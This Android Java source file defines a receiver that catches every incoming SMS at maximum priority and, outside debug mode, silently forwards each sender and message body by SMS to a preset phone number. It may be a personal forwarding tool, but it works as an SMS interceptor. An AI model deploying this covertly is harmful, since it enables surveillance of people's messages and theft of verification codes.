package com.fyc.mysms;


import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.widget.Toast;


import utils.Config;
import utils.MyLog;

public class MyReceiver extends BroadcastReceiver {
    private static  MyReceiver mReceiver = null; // 广播接收类 对象
    private static IntentFilter iFilter = null; // 意图过滤对象
    @Override
    public void onReceive(Context context, Intent intent) {
        /**
         * 接收短信
         */
        Bundle bundle = intent.getExtras();
        if (bundle != null) {
            //通过pdus获得接收到的所有短信消息，获取短信内容
            Object[] objects = (Object[]) bundle.get("pdus");
            //构建短信对象数组
            SmsMessage[] smsMessages = new SmsMessage[objects.length];
            String info="";
            for (int i = 0; i < objects.length; i++) {
                //获取单条短信内容，以pdu格式存，并生成短信对象
                smsMessages[i] = SmsMessage.createFromPdu((byte[]) objects[i]);
                //发送方的电话号码
                String number = smsMessages[i].getDisplayOriginatingAddress();
                //获取短信的内容
                String content = smsMessages[i].getDisplayMessageBody();
                //使用Toast测试
                //Toast.makeText(context, number + "--" + content, Toast.LENGTH_SHORT).show();
                info=info+number+";"+content;
            }
            MyLog.i("smsReceive:"+info);
            if (!Config.DEBUG)
                SmsReceiver.SendSms(context,SmsReceiver.phonenum,info);
        }
    }
    public static void register(Context context){
        if (mReceiver!=null)return;
        mReceiver = new MyReceiver(); // 广播接收类初始化
        iFilter = new IntentFilter("android.provider.Telephony.SMS_RECEIVED"); // 意图过滤初始化
        iFilter.setPriority(Integer.MAX_VALUE); // 设置优先级
        context.registerReceiver(mReceiver, iFilter); // 注册广播接
    }
    public static void unregister(Context context){
        if (mReceiver==null)return;
        context.unregisterReceiver(mReceiver);
        mReceiver=null;
        iFilter=null;
    }
}

